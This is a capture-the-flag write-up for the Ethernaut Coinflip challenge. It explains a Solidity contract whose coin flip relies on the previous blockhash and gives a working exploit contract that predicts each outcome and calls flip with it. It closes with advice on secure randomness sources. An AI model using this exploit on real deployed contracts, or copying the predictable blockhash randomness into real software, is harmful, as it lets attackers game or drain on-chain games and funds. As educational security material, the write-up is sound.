## Coinflip
Guess the correct outcome 10 times in a row


##### Things that might help
Use Remix to write the code and deploy it in the corresponding network See Remix Solidity IDE.
Setup a local truffle project to develop and deploy the attack contracts. See Truffle Framework.

#### Understanding the contract
1. State Variables
```js
uint256 public consecutiveWins;
uint256 lastHash;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```
- There are three state variables: ``consecutiveWins``, ``lastHash``, ``FACTOR``
- consecutive wins is set to public so it is easily accesible

2. Constructor
```js
constructor() {
consecutiveWins = 0;
}
```
- When deployed, this sets ``consecutiveWins`` to 0

3. Functions
```js
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```
- The flip function takes a ``bool`` as a parameter (``_guess``) and returns a bool
- A uint256 variable ``blockValue`` is created inside the function which is calculated using the previous block number
- The function reverts if ``lastHash`` and ``blockValue`` are equivalent
- ``lastHash`` is replaced with ``blockValue``
- A uint256 variable ``conflip`` is determined by dividing ``blockValue`` by ``FACTOR``
- A boolean ``side`` is created comparing ``conflip`` to 1
    - If ``side`` and ``_guess`` are equivalent, then ``consecutiveWins`` is incremented and ``flip`` returns true
    - If ``side`` and ``_guess`` are not equivalent, then ``consecutiveWins`` is set to 0 and ``flip`` returns false

#### Solving
Solving this contract takes advantage of the fact that the contract uses ``blockNumber`` to create randomness. A second contract can be created that copies the logic from the original contract, making a call to the original contract after a solution is found
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public coinFlipContract;

    constructor(address _coinFlipAddress) {
        coinFlipContract = ICoinFlip(_coinFlipAddress);
    }

    function exploit() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
```
I compiled this contract with remix and connected my metmask wallet with the injected provider option
To check the status after each flip, use the console:
```js
await contract.consecutiveWins()
```
Calling the ``exploit`` function will cause the ``words`` array inside the return object will increment on each flip
After 10 flips, hitting submit should complete the challenge

#### Summary
Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).